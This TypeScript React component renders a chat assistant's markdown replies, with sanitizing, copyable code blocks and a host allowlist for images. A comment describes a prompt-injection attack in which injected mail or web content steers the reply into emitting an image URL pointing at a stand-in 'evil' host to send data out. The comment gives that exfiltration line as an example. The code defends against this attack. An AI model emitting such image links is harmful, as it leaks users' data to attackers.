/**
 * Markdown — renders Clara's replies as structured text.
 *
 * Previously every reply appeared as raw text in the chat: `**bold**`, lists,
 * tables and code blocks arrived as a jumble of characters. Gemini, ChatGPT
 * and Claude typeset replies like an article — that is the most visible
 * difference from a modern chat app, and the cheapest improvement.
 *
 * Security: `rehype-sanitize` with the GitHub schema. Raw HTML from the
 * model is discarded, links get `rel="noopener"` and open externally.
 * Tables scroll inside their own frame so the sheet never slides sideways
 * on phones. Code blocks carry a copy button.
 */
import { useState, type ReactNode } from "react";
import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import styles from "./Markdown.module.css";

const SCHEMA = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    code: [...(defaultSchema.attributes?.code ?? []), ["className", /^language-/]],
  },
  protocols: {
    ...defaultSchema.protocols,
    // inline images (data:image/...) are allowed; the img component checks the type
    src: [...(defaultSchema.protocols?.src ?? []), "data"],
  },
};

/**
 * Images load only from our own hosts. A reply can be steered by injected
 * content (a mail, a web page); `![](https://evil/?d=<data>)` would make the
 * browser send that data out without a click. Own hosts are the shell's own
 * host and its sibling subdomains (the base domain from the domain registry,
 * derived at runtime so no host name is hard-coded), relative URLs and
 * inline data images. Everything else is shown as a link, not loaded.
 */
function ownImageSource(src: string): boolean {
  const s = src.trim();
  if (!s) return false;
  if (s.startsWith("data:")) return /^data:image\/(png|jpe?g|gif|webp|avif|svg\+xml)[;,]/i.test(s);
  if (s.startsWith("blob:")) return true;
  if (s.startsWith("/") && !s.startsWith("//")) return true;
  if (!/^[a-z][a-z0-9+.-]*:|^\/\//i.test(s)) return true; // relative path
  let url: URL;
  try {
    url = new URL(s, window.location.href);
  } catch {
    return false;
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") return false;
  const own = window.location.hostname.toLowerCase();
  const host = url.hostname.toLowerCase();
  if (host === own) return true;
  const labels = own.split(".");
  const base = labels.length > 2 ? labels.slice(1).join(".") : own;
  return host === base || host.endsWith(`.${base}`);
}

function SafeImage({ src, alt }: { src?: string; alt?: string }) {
  const href = typeof src === "string" ? src : "";
  if (ownImageSource(href)) {
    return <img src={href} alt={alt ?? ""} loading="lazy" referrerPolicy="no-referrer" />;
  }
  let host = "";
  try {
    host = new URL(href, window.location.href).hostname;
  } catch {
    host = "";
  }
  return (
    <a href={href || undefined} target="_blank" rel="noopener noreferrer nofollow"
      title="Externes Bild — aus Sicherheitsgründen nicht automatisch geladen">
      🖼️ {alt || "Bild"} (externes Bild{host ? ` von ${host}` : ""}, nicht geladen — zum Öffnen tippen)
    </a>
  );
}

function CodeBlock({ children }: { children: ReactNode }) {
  const [ok, setOk] = useState(false);
  const text = extractText(children);
  return (
    <div className={styles.codeWrap}>
      <button
        type="button"
        className={styles.codeCopy}
        onClick={() => {
          navigator.clipboard?.writeText(text).then(() => {
            setOk(true);
            window.setTimeout(() => setOk(false), 1500);
          }).catch(() => undefined);
        }}
        aria-label="Code kopieren"
      >
        {ok ? "✓ Kopiert" : "Kopieren"}
      </button>
      <pre>{children}</pre>
    </div>
  );
}

function extractText(node: ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(extractText).join("");
  if (typeof node === "object" && "props" in node) {
    return extractText((node as { props: { children?: ReactNode } }).props.children);
  }
  return "";
}

const COMPONENTS: Components = {
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
  table: ({ children }) => (
    <div className={styles.tableWrap}>
      <table>{children}</table>
    </div>
  ),
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  ),
  img: ({ src, alt }) => <SafeImage src={typeof src === "string" ? src : undefined} alt={alt} />,
};

/**
 * react-markdown's default transform empties every `data:` URL before the
 * sanitizer and SafeImage ever see it, so inline images (charts, previews)
 * appeared as "external image, not loaded". Inline raster images in an
 * image `src` are let through; SafeImage still checks the type, links stay
 * on the default rules.
 */
function urlTransform(url: string, key: string): string {
  if (key === "src" && /^data:image\/(png|jpe?g|gif|webp|avif);base64,/i.test(url)) return url;
  return defaultUrlTransform(url);
}

export function Markdown({ text }: { text: string }) {
  return (
    <div className={styles.md}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[[rehypeSanitize, SCHEMA]]}
        components={COMPONENTS}
        urlTransform={urlTransform}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
